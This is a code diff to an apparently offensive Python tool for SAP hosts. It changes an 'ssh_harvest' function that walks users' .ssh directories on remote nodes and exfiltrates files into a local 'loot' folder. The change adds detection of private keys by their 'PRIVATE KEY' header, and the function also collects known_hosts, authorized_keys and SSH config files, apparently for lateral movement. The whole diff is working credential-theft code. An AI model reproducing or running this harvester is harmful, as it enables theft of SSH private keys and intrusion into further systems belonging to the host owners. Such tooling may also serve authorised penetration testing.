@@ -560,38 +560,50 @@ def ssh_harvest(node: SAPNode, state: SAPMAPState,
         owner_loot = os.path.join(loot_dir, owner)
         os.makedirs(owner_loot, exist_ok=True)
 
+        _SKIP_FILES = {"known_hosts", "authorized_keys", "config",
+                       "environment"}
         for fname in files:
             if _is_stopped():
                 break
             fpath = f"{ssh_dir}/{fname}"
-            print(f"  [*] {sid}: reading {owner}/{fname} ...")
 
-            # Private keys
-            if fname in ("id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
-                         "id_rsa.pub", "id_ed25519.pub", "id_ecdsa.pub",
-                         "id_dsa.pub"):
-                is_priv = not fname.endswith(".pub")
+            # known_hosts / authorized_keys / config handled below
+            if fname in _SKIP_FILES:
+                print(f"  [*] {sid}: reading {owner}/{fname} ...")
+            elif fname.endswith(".pub"):
+                print(f"  [*] {sid}: reading {owner}/{fname} ...")
                 raw = _exfil_file(exec_fn, fpath, max_size=32768)
                 if raw:
                     local_path = os.path.join(owner_loot, fname)
                     with open(local_path, "wb") as fh:
                         fh.write(raw)
-                    try:
-                        os.chmod(local_path, 0o600)
-                    except Exception:
-                        pass
-                    if is_priv:
+            else:
+                # Potential private key — read and detect by content
+                print(f"  [*] {sid}: reading {owner}/{fname} ...")
+                raw = _exfil_file(exec_fn, fpath, max_size=32768)
+                if raw:
+                    text_head = raw[:64].decode("utf-8", errors="replace")
+                    if "PRIVATE KEY" in text_head:
+                        local_path = os.path.join(owner_loot, fname)
+                        with open(local_path, "wb") as fh:
+                            fh.write(raw)
+                        try:
+                            os.chmod(local_path, 0o600)
+                        except Exception:
+                            pass
+                        key_type = fname.replace("id_", "")
                         all_keys.append({
                             "owner": owner,
                             "path": fpath,
-                            "type": fname.replace("id_", ""),
+                            "type": key_type,
                             "local_path": local_path,
                             "size": len(raw),
                         })
-                        print(f"  [+] {owner}: {fname} ({len(raw)} B)")
+                        print(f"  [+] {owner}: {fname} "
+                              f"({len(raw)} B, private key)")
 
             # known_hosts
-            elif fname == "known_hosts":
+            if fname == "known_hosts":
                 raw = _exfil_file(exec_fn, fpath, max_size=65536)
                 if raw:
                     local_path = os.path.join(owner_loot, "known_hosts")
@@ -611,7 +623,7 @@ def ssh_harvest(node: SAPNode, state: SAPMAPState,
                                 all_known_hosts_targets.add(h)
 
             # authorized_keys
-            elif fname == "authorized_keys":
+            if fname == "authorized_keys":
                 raw = _exfil_file(exec_fn, fpath, max_size=65536)
                 if raw:
                     local_path = os.path.join(owner_loot, "authorized_keys")
@@ -632,7 +644,7 @@ def ssh_harvest(node: SAPNode, state: SAPMAPState,
                         })
 
             # config
-            elif fname == "config":
+            if fname == "config":
                 raw = _exfil_file(exec_fn, fpath, max_size=32768)
                 if raw:
                     local_path = os.path.join(owner_loot, "config")
